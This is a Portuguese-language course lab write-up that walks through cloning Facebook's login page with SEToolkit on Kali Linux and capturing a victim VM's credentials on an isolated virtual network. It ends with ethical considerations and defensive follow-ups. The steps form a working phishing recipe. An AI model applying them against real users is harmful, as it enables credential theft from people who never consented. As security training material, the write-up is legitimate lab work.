# Phishing para captura de senhas do Facebook

# 🐍 Laboratório Prático de Engenharia Social com SEToolkit no Kali Linux

**Autor:** Abel Aparecido de Lima  
**Data:** 07/06/2025  
**Curso:** Cibersegurança | Plataforma DIO  
**Tema:** Ataque de Engenharia Social com SEToolkit (Web Attack: Credential Harvester / Tabnabbing)  
**Objetivo:** Simular um ataque de engenharia social entre máquinas virtuais utilizando o Kali Linux e o SEToolkit para coleta de credenciais.

---

## 🧪 Estrutura do Laboratório

O ambiente de laboratório foi montado utilizando o **VirtualBox**, com as seguintes máquinas:

| Função        | Sistema Operacional | Nome da Máquina | IP Exemplo           |
|---------------|----------------------|------------------|-----------------------|
| Atacante      | Kali Linux (VM)      | kali-vm          | `192.168.56.101`      |
| Alvo (vítima) | Xubuntu (VM)         | xubuntu-vm       | `192.168.56.102`      |
| Host (real)   | Windows (físico)     | host-machine     | `192.168.15.9` (não usado) |

> **Observação:** O IP da máquina real (host) foi ignorado no ataque, pois o ataque acontece entre as VMs.

---

## 🎯 Objetivo do Ataque

Realizar um ataque de **Credential Harvesting com Tabnabbing** usando o SEToolkit, onde a vítima (Xubuntu) acessa uma página falsa hospedada na Kali, acreditando ser legítima, e insere suas credenciais, que são então capturadas pelo atacante.

---

## 🔧 Configurações de Rede no VirtualBox

Para que a comunicação entre as máquinas virtuais seja possível de forma direta, o modo de rede escolhido foi:

### ✔️ Modo **Rede Interna** (Internal Network)
- Permite que todas as VMs se comuniquem entre si, sem interferência do host.
- IPs são atribuídos automaticamente pela rede interna.

### Alternativa: **Rede em Bridge**
- Caso deseje comunicação com a rede externa ou outros dispositivos físicos.

---

## 🚀 Execução do Ataque com SEToolkit

### Passo a Passo no Kali Linux:

1. **Abrir terminal e obter privilégios de root:**
   ```bash
   sudo su
   ```

2. **Executar o SEToolkit:**
   ```bash
   setoolkit
   ```

3. **Selecionar o tipo de ataque:**
   ```
   [1] Social-Engineering Attacks
   [2] Website Attack Vectors
   [3] Credential Harvester Attack Method
   [2] Site Cloner
   ```

4. **Inserir o IP para redirecionamento (POST back):**

   O SEToolkit irá perguntar:

   ```
   [SET:webattack] IP address for the POST back in Harvester/Tabnabbing [192.168.15.9]:
   ```

   ⚠️ **Importante:** *Não usar o IP sugerido (geralmente o do host físico), pois o ataque está sendo conduzido a partir da máquina Kali.*

   ✅ Em vez disso, digite manualmente o IP da **Kali**:

   ```bash
   192.168.56.101
   ```

   (Use `ip a` no terminal para descobrir o IP real da sua máquina Kali.)

5. **Inserir o site alvo a ser clonado:**
   Por exemplo:
   ```
   https://facebook.com
   ```

   O SEToolkit irá clonar a página e criar um servidor local que hospeda a versão falsa.

---

## 👁️‍🗨️ Acesso pela Máquina Vítima (Xubuntu)

Na máquina Xubuntu:

1. **Abrir o navegador.**
2. **Acessar diretamente o IP da Kali:**
   ```bash
   http://192.168.56.101
   ```

   A página falsa (Facebook, neste exemplo) será exibida.
3. **Ao digitar e enviar os dados**, as credenciais serão capturadas pela Kali e salvas no terminal ou em arquivos `.txt` no SEToolkit.

---

## 🧠 Por que usar o IP da Kali no SEToolkit?

Mesmo que a Kali seja a **atacante**, ela está **hospedando** o servidor falso. Ou seja, o navegador da vítima precisa saber **onde** está esse servidor.

Por isso, o SEToolkit exige que você digite **manualmente o IP da máquina Kali**, garantindo que:

- A vítima seja redirecionada corretamente.
- O servidor do ataque esteja acessível.
- As credenciais sejam enviadas para o lugar certo.

---

## ✅ Resultados

- O ataque foi executado com sucesso.
- As credenciais inseridas na página falsa foram capturadas corretamente.
- O fluxo de rede entre as máquinas virtuais foi funcional utilizando IPs internos.

---

## 🛡️ Considerações Éticas

Este laboratório é **exclusivamente educacional**, voltado para o desenvolvimento de habilidades técnicas em ambientes controlados.  
Ataques de engenharia social em ambientes reais são ilegais e antiéticos sem consentimento prévio e formal.

---

## 📚 Próximos Passos

- Estender o experimento para outros tipos de ataque do SEToolkit.
- Implementar um IDS (sistema de detecção de intrusos) na máquina vítima para observar comportamentos suspeitos.
- Analisar logs de rede usando Wireshark.
- Replicar o experimento com ataques de phishing mais avançados.

---

## 🗂️ Referências

- Kali Linux Docs: https://www.kali.org/docs/
- SEToolkit GitHub: https://github.com/trustedsec/social-engineer-toolkit
- Curso DIO - Cibersegurança para Iniciantes

### Resutados

![Screenshot 2025-06-07 173321](https://github.com/user-attachments/assets/86c40154-550e-483a-ad30-3a062f4e69d0)
